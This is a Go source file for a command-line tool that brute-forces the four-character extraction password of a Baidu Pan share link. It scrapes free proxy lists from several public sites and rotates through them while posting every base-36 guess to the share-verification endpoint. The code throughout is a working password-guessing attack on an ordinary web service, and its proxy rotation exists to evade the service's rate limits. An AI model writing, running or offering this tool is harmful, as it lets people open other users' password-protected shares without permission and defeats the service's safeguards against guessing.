package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"gopkg.in/alecthomas/kingpin.v2"
	"gopkg.in/cheggaaa/pb.v1"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	MAX_VALUE  int64 = 1679616 // 36^4
	MAX_RETRY        = 10
	RETRY_TIME       = 5 * time.Second
	TIMEOUT          = 20 * time.Second
)

var (
	link        = kingpin.Arg("link", "URL of BaiduYun file you want to get.").Required().String()
	preset      = kingpin.Flag("preset", "The preset start of key to brute.").Short('p').Default("0000").String()
	thread      = kingpin.Flag("thread", "Number of thread.").Short('t').Default("10").Int64()
	resolver    []*Resolve
	bar         *pb.ProgressBar
	shareid, uk string
	start       int64
	refer       string
	wg          sync.WaitGroup
	proxies     map[Proxy]int
	updater     []*Proxies
	mapLocker   *sync.Mutex
	useable     *AtomBool
	nullP       Proxy
)

type Info struct {
	Errno  int    `json:"errno"`
	ErrMsg string `json:"err_msg"`
}

type Proxy struct {
	typ, addr, port string
}

type Resolve struct {
	re  *regexp.Regexp
	fun func(*regexp.Regexp, string)
}

type Proxies struct {
	update func()
}

type AtomBool struct {
	flag bool
	lock *sync.Mutex
}

func (b *AtomBool) Set(value bool) {
	b.lock.Lock()
	defer b.lock.Unlock()
	b.flag = value
}

func (b *AtomBool) Get() bool {
	b.lock.Lock()
	defer b.lock.Unlock()
	if b.flag {
		b.flag = false
		return true
	}
	return false
}

func getProxy() (Proxy, bool) {
	mapLocker.Lock()
	defer mapLocker.Unlock()
	for {
		if len(proxies) <= 0 {
			return nullP, false
		}
		ran := rand.Intn(len(proxies))
		cnt := 0
		for i, k := range proxies {
			if k >= MAX_RETRY {
				delete(proxies, i)
				break
			}
			if cnt == ran {
				return i, true
			}
			cnt++
		}
	}
}

func addProxy(in Proxy) {
	mapLocker.Lock()
	defer mapLocker.Unlock()
	proxies[in] = 0
}

func deleteProxy(in Proxy) {
	mapLocker.Lock()
	defer mapLocker.Unlock()
	delete(proxies, in)
}

func increProxy(in Proxy) {
	mapLocker.Lock()
	defer mapLocker.Unlock()
	proxies[in]++
}

func saveProxies() {
	updater = append(updater,
		&Proxies{
			func() {
				for {
					resp, err := http.Get("http://api.xicidaili.com/free2016.txt")
					if err != nil || resp.Body == nil {
						log.Println(err)
						time.Sleep(RETRY_TIME)
					}
					sca := bufio.NewScanner(resp.Body)
					for sca.Scan() {
						spl := strings.Split(sca.Text(), ":")
						if len(spl) != 2 {
							log.Fatal("Unexpected error: ", sca.Text())
						}
						ne := Proxy{"http", spl[0], spl[1]}
						addProxy(ne)
					}
					resp.Body.Close()
					time.Sleep(15 * time.Minute)
				}
			},
		})
	updater = append(updater,
		&Proxies{
			func() {
				for {
					resp, err := http.Get("http://proxy.tekbreak.com/1000/json")
					if err != nil || resp.Body == nil {
						log.Println(err)
						time.Sleep(RETRY_TIME)
					}
					var sca []struct {
						IP   string `json:"ip"`
						Port string `json:"port"`
						Type string `json:"type"`
					}
					if err := json.NewDecoder(resp.Body).Decode(&sca); err != nil {
						log.Println(err)
						time.Sleep(RETRY_TIME)
					}
					for _, i := range sca {
						ne := Proxy{addr: i.IP, port: i.Port}
						ignore := false
						switch i.Type {
						case "HTTP":
							ne.typ = "http"
						case "HTTPS":
							ne.typ = "https"
						default:
							ignore = true
						}
						if !ignore {
							addProxy(ne)
						}
					}
					resp.Body.Close()
					time.Sleep(5 * time.Minute)
				}
			},
		})
	updater = append(updater,
		&Proxies{
			func() {
				for {
					resp, err := http.Get("http://free-proxy-list.net/")
					if err != nil || resp.Body == nil {
						log.Println(err)
						time.Sleep(RETRY_TIME)
					}
					conte, err := ioutil.ReadAll(resp.Body)
					resp.Body.Close()
					if err != nil {
						log.Println(err)
						time.Sleep(RETRY_TIME)
					}
					re, _ := regexp.Compile(`<tr><td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td><td>.*</td><td>.*</td><td>.*</td><td>.*</td><td>(yes|no)</td><td>.*</td></tr>`)
					sca := re.FindAllStringSubmatch(string(conte), -1)
					for _, i := range sca {
						if len(i) != 4 {
							log.Fatal("Unexpected error: ", i)
						}
						if i[3] == "yes" {
							i[3] = "https"
						} else if i[3] == "no" {
							i[3] = "http"
						}
						ne := Proxy{i[3], i[1], i[2]}
						addProxy(ne)
					}
					time.Sleep(5 * time.Minute)
				}
			},
		})
	updater = append(updater,
		&Proxies{
			func() {
				for {
					resp, err := http.Get("https://www.sslproxies.org/")
					if err != nil || resp.Body == nil {
						log.Println(err)
						time.Sleep(RETRY_TIME)
					}
					conte, err := ioutil.ReadAll(resp.Body)
					resp.Body.Close()
					if err != nil {
						log.Println(err)
						time.Sleep(RETRY_TIME)
					}
					re, _ := regexp.Compile(`<tr><td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>.*</tr>`)
					sca := re.FindAllStringSubmatch(string(conte), -1)
					for _, i := range sca {
						if len(i) != 3 {
							log.Fatal("Unexpected error: ", i)
						}
						ne := Proxy{"https", i[1], i[2]}
						addProxy(ne)
					}
					time.Sleep(5 * time.Minute)
				}
			},
		})
}

func next(now string, count int64) int64 {
	num, err := strconv.ParseInt(now, 36, 64)
	if err != nil || num < 0 || num > MAX_VALUE {
		log.Fatal("Not a valid number!")
	}
	return num + count
}

func saveResolver() {
	re1, _ := regexp.Compile(`//pan\.baidu\.com/share/init\?shareid=(\d+)&uk=(\d+)`)
	resolver = append(resolver,
		&Resolve{
			re1,
			func(re *regexp.Regexp, ori string) {
				ret := re.FindStringSubmatch(ori)
				if len(ret) != 3 {
					log.Fatal("Unexpected error: ", ori)
				}
				shareid = ret[1]
				uk = ret[2]
				refer = ori
			},
		})
	re2, _ := regexp.Compile(`//pan\.baidu\.com/s/[a-zA-Z0-9]+`)
	resolver = append(resolver,
		&Resolve{
			re2,
			func(re *regexp.Regexp, ori string) {
				jar, _ := cookiejar.New(nil)
				session := &http.Client{
					Jar: jar,
					CheckRedirect: func(req *http.Request, via []*http.Request) error {
						return http.ErrUseLastResponse
					},
				}
				for {
					resp, err := session.Get(ori)
					if err != nil {
						log.Println(err)
						time.Sleep(RETRY_TIME)
						continue
					}
					if resp.StatusCode == 200 {
						log.Fatal("Link seems password-less!")
					} else if resp.StatusCode == 302 {
						if resolver[0].re.MatchString(resp.Header.Get("Location")) {
							resolver[0].fun(resolver[0].re, resp.Header.Get("Location"))
						} else {
							log.Fatal("Unexpected error: ", ori, resp.Header.Get("Location"))
						}
						break
					}
				}
			},
		})
}

func builder(now string) (*http.Response, Proxy, error) {
	var pro Proxy
	for {
		var ok bool
		if pro, ok = getProxy(); ok {
			useable.Set(true)
			break
		}
		if useable.Get() {
			log.Println("No proxies left! Threads will hang up...")
		}
		time.Sleep(RETRY_TIME)
	}
	par, _ := url.Parse(fmt.Sprintf("%s://%s:%s", pro.typ, pro.addr, pro.port))
	session := &http.Client{
		Timeout:   TIMEOUT,
		Transport: &http.Transport{Proxy: http.ProxyURL(par)},
	}
	req, err := http.NewRequest("POST", fmt.Sprintf("https://pan.baidu.com/share/verify?shareid=%s&uk=%s", shareid, uk), strings.NewReader(fmt.Sprintf("pwd=%04s&vcode=&vcode_str=", now)))
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36")
	req.Header.Set("Origin", "https://pan.baidu.com")
	req.Header.Set("Referer", refer)
	resp, err := session.Do(req)
	return resp, pro, err
}

func tester(work int64) {
	for work < MAX_VALUE {
		now := strconv.FormatInt(work, 36)
		info := new(Info)
		for {
			if resp, pro, err := builder(now); err == nil {
				if resp.StatusCode == 200 {
					if err = json.NewDecoder(resp.Body).Decode(info); err == nil {
						if info.Errno == 0 {
							log.Println("Key found!", now)
							os.Exit(0)
						} else if info.Errno != -9 {
							increProxy(pro)
							log.Println("Unknown error! Service returned", info.Errno, "with message:", info.ErrMsg)
						} else {
							addProxy(pro) // Set the counter to zero
							break
						}
					}
				} else if resp.StatusCode == 404 {
					deleteProxy(pro)
				} else {
					increProxy(pro)
					log.Println("Unknown error! Server returned", resp.StatusCode)
				}
				resp.Body.Close()
			} else if strings.Contains(err.Error(), "error connecting to proxy") {
				increProxy(pro)
			}
			time.Sleep(RETRY_TIME)
		}
		bar.Increment()
		work += *thread
	}
	wg.Done()
}

func init() {
	kingpin.CommandLine.HelpFlag.Short('h')
	kingpin.Parse()
	saveResolver() // For future expansion of resolver
	mapLocker = new(sync.Mutex)
	useable = new(AtomBool)
	useable.lock = new(sync.Mutex)
	proxies = make(map[Proxy]int)
	saveProxies() // For future expansion of proxy
	var indi int
	for indi = 0; indi < len(resolver); indi++ {
		if resolver[indi].re.MatchString(*link) {
			resolver[indi].fun(resolver[indi].re, *link)
			break
		}
	}
	if indi == len(resolver) {
		log.Fatal("No proper resolver found!")
	}
	for _, i := range updater {
		go i.update()
	}
	start = next(*preset, 0)
	bar = pb.New64(MAX_VALUE)
	bar.SetMaxWidth(70)
	bar.ShowCounters = false
	bar.ShowSpeed = true
	bar.ShowTimeLeft = true
	bar.Set64(start)
	bar.Start()
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		for _ = range c {
			log.Printf("Terminating program, current progress: %04s", strconv.FormatInt(bar.Get(), 36))
			os.Exit(1)
		}
	}()
}

func main() {
	log.SetPrefix("\n") // For compatibility with indicator
	wg.Add(int(*thread))
	for i := int64(0); i < *thread; i++ {
		go tester(start + i)
	}
	wg.Wait()
	log.Fatal("No key found!")
}
